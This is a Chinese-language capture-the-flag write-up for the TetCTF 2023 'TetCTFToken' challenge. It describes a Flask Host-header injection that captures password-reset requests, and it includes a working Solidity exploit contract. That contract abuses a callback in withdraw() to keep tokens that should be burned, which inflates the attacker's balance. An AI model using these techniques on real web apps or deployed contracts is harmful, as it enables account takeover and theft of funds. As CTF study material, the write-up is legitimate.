---
title: Blockchain - TetCTFToken
description: 2023 | TetCTF | WEB
tags:
    - web
    - smart contract
---

## 题目

- So, this year, we have something cool for you. We hope you will enjoy it. Happy New Year. ~Cheers,
- Server: http://172.105.114.30:31337

[:material-download: `tetctftoken.zip`](static/tetctftoken.zip)

## 解题思路

- 不太常见的 Web2 + Web3 组合题，不过幸好两个部分可以独立解题 (=ω=)
- Strellic 完成了 Web2 的部分，关键点在 `app.py` 中函数 `userType` 使用了 [`url_for('gen_token', Type=_secret_token, _external=True)`](https://flask.palletsprojects.com/en/2.2.x/api/#flask.Flask.url_for) 来获取 `_secret_reset_passwd_URL`，并向其发送包含新密码的请求
    - 因为 `external=True`，所以会结合设置的 `SERVER_NAME` 来生成完整的 URL
    - 而服务器并没有设置 `SERVER_NAME`，因此会从请求头中获取 `Host` 字段作为 `SERVER_NAME`[^bind_to_environ]
    - 将 `Host` 设置为可控地址，再发送重置密码的请求，就可以监听到服务器请求 `/secret-token/<Type>`，其中，`Type` 对应新的账户密码
- `TetCTFToken/templates/dashboard.html` 中给出了合约 [TetCTFToken](https://testnet.bscscan.com/address/0x1f179302c95bb40be5ec969fb670b0430cf73b01) 和 [FlagStore](https://testnet.bscscan.com/address/0x5222a03a645a1f71d946a6399881d60dbb5f569e) 的地址，并在 BscScan 上提供了合约的源码

    ```js
    //SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    // 为了方便阅读，将父合约转换成 import 的形式
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "@openzeppelin/contracts/access/Ownable.sol";
    import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

    contract TetCTFToken is ERC20("TetCTF Token", "TetCTF"), Ownable, ReentrancyGuard {
        function mint(address _to, uint _amount) external onlyOwner {
            _mint(_to, _amount);
        }

        function burn(address _from, uint _amount) external onlyOwner {
            _burn(_from, _amount);
        }
    }

    contract FlagStore is Ownable, ReentrancyGuard {
        TetCTFToken public immutable token;

        uint public flagPrice  = 1337 * 1e18;
        mapping (string => bool) public flagClaimed;

        constructor() {
            token = new TetCTFToken();
        }

        function setFlagPrice(uint price) external onlyOwner {
            flagPrice = price;
        }

        function deposit() external payable nonReentrant {
            token.mint(msg.sender, msg.value);
        }

        function withdraw() external nonReentrant {
            require(token.balanceOf(msg.sender) > 0, "Insufficient balance");

            (bool success, ) = msg.sender.call{value: token.balanceOf(msg.sender)}("");
            require(success, "Failed to send Ether");

            token.burn(msg.sender, token.balanceOf(msg.sender));
        }

        function buyFlag(string memory user) external returns (bool) {
            require(address(msg.sender).code.length == 0, "Smart contract is not allowed");
            require(token.balanceOf(msg.sender) >= flagPrice, "Insufficient balance");

            token.burn(msg.sender, flagPrice);
            flagClaimed[user] = true;

            return true;
        }
    }
    ```

- `FlagStore` 是主要交互合约，可以通过函数 `deposit` 用 BNB 换取等量的 `TetCTFToken`，随后可通过 `withdraw` 将账户中所有的 `TetCTFToken` 换回等量的 BNB
- 函数 `deposit` 和 `withdraw` 均使用了 `nonReentrant` 修饰符，以防止重入攻击，即便如此，由于不符合 Checks-Effects-Interactions 模式，`msg.sender.call{value: token.balanceOf(msg.sender)}("")` 也是值得重点关注的对象。不能重复调用 `deposit` 和 `withdraw`，那么在合约的回调函数中还能做什么呢？
- 注意到 `msg.sender.call` 和 `token.burn` 都使用了 `token.balanceOf` 来获取调用者持有 `TetCTFToken` 的数量，因此即使在 `msg.sender.call` 触发的回调函数中转移 `TetCTFToken`，`token.burn` 也不会抛出异常

    ```js
    contract Hack is Ownable {
        FlagStore store;
        TetCTFToken token;
        constructor(address instance) payable {
            store = FlagStore(instance);
            token = TetCTFToken(store.token());
        }

        // 调用一次汽油费约 0.12 BNB，尽可能提高单次交易金额以节约资金
        function exploit() public {
            for(uint i = 0; i < 191; i ++) {
                store.deposit{value: 1 ether}();
                store.withdraw();
            }
        }

        function destruct() public onlyOwner {
            selfdestruct(payable(msg.sender));  // 回收 BNB (╥ω╥)
        }

        receive() payable external {
            token.transfer(tx.origin, 1e18);
        }
    }
    ```

- 获取足够的 `TetCTFToken` 后，调用 `buyFlag` 并传入在网站注册的用户名，最后 [Buy Flag](http://172.105.114.30:31337/showBuyFlag) 就可以啦 :D

[^bind_to_environ]: [URL Routing — Werkzeug Documentation](https://werkzeug.palletsprojects.com/en/2.2.x/routing/#werkzeug.routing.Map.bind_to_environ)